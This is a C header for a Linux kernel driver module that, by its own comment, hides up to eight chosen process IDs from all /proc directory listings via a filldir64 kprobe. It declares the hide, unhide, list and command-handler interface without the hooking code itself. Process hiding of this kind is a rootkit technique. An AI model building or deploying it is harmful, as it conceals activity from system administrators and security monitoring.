// SPDX-License-Identifier: GPL-2.0-only
// PID concealment via filldir64 kprobe; hides up to HIDE_TASK_MAX_SLOTS PIDs from every /proc readdir.
#ifndef DRIVER_HIDE_TASK_H
#define DRIVER_HIDE_TASK_H

#include <linux/types.h>

#define HIDE_TASK_MAX_SLOTS 8

#if KCFG_HIDE_TASK

int hide_task_init(void);
int hide_task_add(pid_t pid);
int hide_task_remove(pid_t pid);
void hide_task_clear(void);
int hide_task_list(pid_t *out, size_t max);
bool hide_task_contains(pid_t pid);

long do_hide_task_cmd(unsigned int cmd, void __user *arg);

#else

#include <linux/errno.h>
static inline int hide_task_init(void) { return 0; }
static inline int hide_task_add(pid_t pid) { (void)pid; return -EOPNOTSUPP; }
static inline int hide_task_remove(pid_t pid) { (void)pid; return -EOPNOTSUPP; }
static inline void hide_task_clear(void) { }
static inline int hide_task_list(pid_t *out, size_t max) { (void)out; (void)max; return -EOPNOTSUPP; }
static inline bool hide_task_contains(pid_t pid) { (void)pid; return false; }
static inline long do_hide_task_cmd(unsigned int cmd, void __user *arg) { (void)cmd; (void)arg; return -EOPNOTSUPP; }

#endif /* KCFG_HIDE_TASK */

#endif /* DRIVER_HIDE_TASK_H */
